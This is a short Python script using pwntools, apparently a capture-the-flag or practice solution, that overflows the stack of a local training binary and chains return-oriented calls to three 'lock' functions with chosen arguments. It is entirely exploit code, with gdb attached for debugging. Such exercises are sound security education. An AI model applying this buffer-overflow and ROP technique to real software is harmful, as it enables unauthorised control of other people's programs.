from pwn import *

# useful locations
lock1 = 0x8048506
lock2 = 0x804856d
lock3 = 0x80485da

pop_ret = 0x08048361

# start the vuln program as a  process
p = process("./three_locks_32")

# attach process to gdb
gdb.attach(p, '''
echo "This is attached to gdb!"
break lock1
break lock2
break lock3
''')

# stack - this is where we can build our ROP exploit
payload = cyclic(cyclic_find("jaaa")) # padding

# lock1
payload += p32(lock1) # this is our eip
payload += p32(pop_ret) # pop the 5 then ret to lock2
payload += p32(5) # this is our paramter

# lock2
payload += p32(lock2) # we jump to lock2
payload += p32(lock3) # we can return right to lock3
payload += p32(42) # this is our first
payload += p32(1776) # 1776 is the second paramter

# send payload
p.sendline(payload)
p.interactive()